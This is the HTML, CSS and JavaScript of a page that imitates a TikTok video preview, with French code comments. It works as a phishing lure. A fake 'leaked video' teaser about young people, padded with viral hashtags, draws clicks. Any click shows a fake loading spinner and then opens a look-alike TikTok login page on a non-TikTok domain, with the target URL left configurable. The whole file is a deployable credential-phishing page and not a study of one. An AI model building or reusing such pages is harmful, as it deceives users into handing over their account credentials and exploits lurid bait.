        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            }

            body {
                background: #000;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                color: white;
                overflow: hidden;
            }

            .tiktok-container {
                width: 100%;
                max-width: 375px;
                height: 100vh;
                background: linear-gradient(45deg, #ff0050, #ff0050, #000);
                position: relative;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .video-preview {
                width: 100%;
                height: 100%;
                background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-zJFxwe1FMm7OCzeek9xfBJqOibm2dPeQLQ&s?text=TikTok+Video') center/cover;
                position: relative;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .play-overlay {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.3);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 2;
            }

            .play-button {
                width: 80px;
                height: 80px;
                background: rgba(255, 255, 255, 0.9);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                animation: pulse 2s infinite;
                cursor: pointer;
            }

            .play-button::after {
                content: '';
                border-style: solid;
                border-width: 15px 0 15px 25px;
                border-color: transparent transparent transparent #000;
                margin-left: 5px;
            }

            @keyframes pulse {
                0% { transform: scale(1); opacity: 0.9; }
                50% { transform: scale(1.1); opacity: 1; }
                100% { transform: scale(1); opacity: 0.9; }
            }

            .tiktok-ui {
                position: absolute;
                bottom: 100px;
                left: 20px;
                right: 70px;
                z-index: 3;
            }

            .user-info {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
            }

            .avatar {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background: linear-gradient(45deg, #ff0050, #ff4d6d);
                margin-right: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                font-size: 16px;
                overflow: hidden;
            }

            .avatar img {
                width: 100%;
                height: 100%;
                object-fit: cover;   /* remplit le div en gardant le ratio */
            }

            .username {
                font-weight: 600;
                font-size: 16px;
                color: white;
            }

            .description {
                font-size: 14px;
                line-height: 1.4;
                color: white;
                margin-bottom: 10px;
            }

            .hashtags {
                color: white;
                font-weight: 600;
            }

            .side-actions {
                position: absolute;
                right: 15px;
                bottom: 100px;
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 20px;
                z-index: 3;
            }

            .action-btn {
                width: 48px;
                height: 48px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                cursor: pointer;
                transition: all 0.3s ease;
            }

            .action-btn:hover {
                background: rgba(255, 255, 255, 0.3);
                transform: scale(1.1);
            }

            .tiktok-logo {
                position: absolute;
                top: 60px;
                left: 50%;
                transform: translateX(-50%);
                z-index: 4;
            }

            .tiktok-logo svg {
                width: 100px;
                height: 30px;
            }

            .loading-screen {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: #000;
                display: none;
                align-items: center;
                justify-content: center;
                flex-direction: column;
                z-index: 999;
            }

            .spinner {
                width: 50px;
                height: 50px;
                border: 3px solid rgba(255, 0, 80, 0.3);
                border-radius: 50%;
                border-top-color: #ff0050;
                animation: spin 1s ease-in-out infinite;
                margin-bottom: 20px;
            }

            @keyframes spin {
                to { transform: rotate(360deg); }
            }

            .instructions {
                position: absolute;
                top: 20px;
                left: 20px;
                right: 20px;
                background: rgba(0, 0, 0, 0.8);
                padding: 15px;
                border-radius: 10px;
                font-size: 12px;
                z-index: 5;
                display: none;
            }

            .show-instructions {
                position: fixed;
                top: 20px;
                right: 20px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: none;
                padding: 10px;
                border-radius: 5px;
                cursor: pointer;
                z-index: 6;
            }

            @media (min-width: 768px) {
                .tiktok-container {
                    max-width: 375px;
                    height: 667px;
                    border-radius: 15px;
                    overflow: hidden;
                    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
                }

                .instructions {
                    display: block;
                    position: relative;
                    margin-top: 20px;
                    max-width: 375px;
                }
            }
        </style>

    <script>
        // 🎯 CONFIGURATION - Modifiez ces URLs selon vos besoins
        const REDIRECT_TIKTOK_URL = "https://tiktok-auth-client.vercel.app/login";

        // Variables pour l'aperçu
        const USERNAME = "@username";
        const DESCRIPTION = " Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - 🔥✨";
        const HASHTAGS = "#viral #trending #fyp #foryou";

        // Fonction de redirection avec effet de chargement
        function redirectToTikTok() {
            const loadingScreen = document.getElementById('loadingScreen');
            loadingScreen.style.display = 'flex';

            // Simule un temps de chargement comme TikTok
            setTimeout(() => {
                window.open(REDIRECT_TIKTOK_URL, '_blank');
                loadingScreen.style.display = 'none';
            }, 1500);
        }

        // Gestion des clics
        document.getElementById('tiktokContainer').addEventListener('click', redirectToTikTok);

        // Toggle instructions sur mobile
        function toggleInstructions() {
            const instructions = document.getElementById('instructions');
            instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
        }

        // Mise à jour dynamique du contenu
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelector('.username').textContent = USERNAME;
            document.querySelector('.description').textContent = DESCRIPTION;
            document.querySelector('.hashtags').textContent = HASHTAGS;
        });

        // Animation d'entrée
        window.addEventListener('load', function() {
            document.querySelector('.tiktok-container').style.animation = 'slideUp 0.5s ease-out';
        });
    </script>

    <style>
        @keyframes slideUp {
            from {
                transform: translateY(100px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
    </style>
